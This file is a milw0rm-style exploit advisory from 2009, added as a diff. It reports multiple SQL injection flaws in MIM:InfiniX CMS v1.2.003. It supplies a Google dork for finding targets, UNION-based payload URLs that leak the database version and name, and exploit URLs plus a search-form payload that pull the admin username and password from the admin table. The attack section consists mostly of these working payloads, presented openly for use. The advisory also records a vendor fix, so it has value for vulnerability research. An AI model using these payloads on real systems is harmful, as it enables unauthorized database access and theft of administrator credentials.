@@ -1,0 +1,127 @@
+***********************************************************************************************
+***********************************************************************************************
+**	       										     **
+**  											     **
+**     [] [] []  [][][][>  []     []  [][  ][]     []   [][]]  []  [>  [][][][>  [][][][]    **
+**     || || ||  []        [][]   []   []  []     []   []      [] []   []	 []    []    **
+** [>  [][][][]  [][][][>  [] []  []   []  []   [][]  []       [][]    [][][][>  []    []    **
+**  [-----[]-----[][][][>--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][>--[][][][]---\ 
+**==[>    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  >>--
+**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
+   [>   [[[]]]   [][][][>  [][]   [] [][[] [[]]  [][]  [][][]  []  [>  [][][][> <][]   []    **
+**							                                     **
+**    											     **
+**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
+**					¡PROUD TO BE SPANISH!				     **
+**											     **
+***********************************************************************************************
+***********************************************************************************************
+
+----------------------------------------------------------------------------------------------
+|       	   	  MULTIPLE REMOTE SQL INJECTION VULNERABILITIES	            	     |
+|--------------------------------------------------------------------------------------------|
+|                         	|     MIM:InfiniX v1.2.003     |		 	     |
+|  CMS INFORMATION:		 ------------------------------			             |
+|										             |
+|-->WEB: http://mim.infinix.it         				     			     |
+|-->DOWNLOAD: https://sourceforge.net/projects/infinix/           	                     |
+|-->DEMO: http://mim.infinix.it								     |
+|-->CATEGORY: CMS / Portal								     |
+|-->DESCRIPTION: MIM:InfiniX Manuale Intermediale della Modernita': Infinite Info...         |
+|		in Xml PHP-XHTML-XML-XSL-CSS-AJAX-RDF. Design your CMS and store...          |
+|-->RELEASED: 2009-04-21								     |
+|											     |
+|  CMS VULNERABILITY:									     |
+|											     |
+|-->TESTED ON: firefox 3						                     |
+|-->DORK: "Developed by rbk"							             |
+|-->CATEGORY: MULTIPLE SQL INJECTION VULNERABILITIES				             |
+|-->AFFECT VERSION: 1.2.003 (maybe <= ?)				 		     |
+|-->Discovered Bug date: 2009-04-27							     |
+|-->Reported Bug date: 2009-04-27							     |
+|-->Fixed bug date: 2009-04-28								     |
+|-->Info patch: v1.2.003							             |
+|-->Author: YEnH4ckEr									     |
+|-->mail: y3nh4ck3r[at]gmail[dot]com							     |
+|-->WEB/BLOG: N/A									     |
+|-->COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.       |
+|-->EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)			     |
+----------------------------------------------------------------------------------------------
+
+
+#########################
+////////////////////////
+
+SQL INJECTION (SQLi):
+
+////////////////////////
+#########################
+
+
+<<<<---------++++++++++++++ Condition: magic_quotes_gpc=off +++++++++++++++++--------->>>>
+
+
+-------
+INTRO:
+-------
+
+
+Admin choose to use database or not.
+
+This CMS is completely vulnerable to SQL Injection (I only show some vars).
+
+
+
+------------------
+PROOF OF CONCEPT:
+------------------
+
+
+For example ("month" and "year" GET vars). Links:
+
+
+http://[HOST]/[HOME_PATH]/index.php?mode=calendar&selectedday=18&month=5&year=2009%27+AND+0+UNION+ALL+SELECT+1,version(),database(),4,5,6/*
+
+http://[HOST]/[HOME_PATH]/index.php?mode=calendar&selectedday=18&month=5%27+AND+0+UNION+ALL+SELECT+1,version(),database(),4,5,6/*&year=2009
+
+
+Another example (search post form). Search this:
+
+
+anything%')) union all select 1,database(),version(),user(),5,6,7,8,9,database(),11#
+
+
+----------
+EXPLOITS:
+----------
+
+
+We get the admin credentials:
+
+
+http://[HOST]/[HOME_PATH]/index.php?mode=calendar&selectedday=18&month=5&year=2009%27+AND+0+UNION+ALL+SELECT+1,user,pass,4,5,6 FROM admin WHERE id=1/*
+
+http://[HOST]/[HOME_PATH]/index.php?mode=calendar&selectedday=18&month=5%27+AND+0+UNION+ALL+SELECT+1,user,pass,4,5,6+FROM+admin+WHERE+id=1/*&year=2009
+
+
+anything%')) union all select 1,database(),database(),concat(user,'--::--',pass),5,6,7,8,9,database(),11 FROM admin WHERE id=1#
+
+
+
+
+<<<-----------------------------EOF---------------------------------->>>ENJOY IT!
+
+
+#######################################################################
+#######################################################################
+##*******************************************************************##
+## ESPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!  ##
+##*******************************************************************##
+##-------------------------------------------------------------------##
+##*******************************************************************##
+##        GREETZ TO: JosS and all SPANISH Hack3Rs community!         ##
+##*******************************************************************##
+#######################################################################
+#######################################################################
+
+# milw0rm.com [2009-04-28]
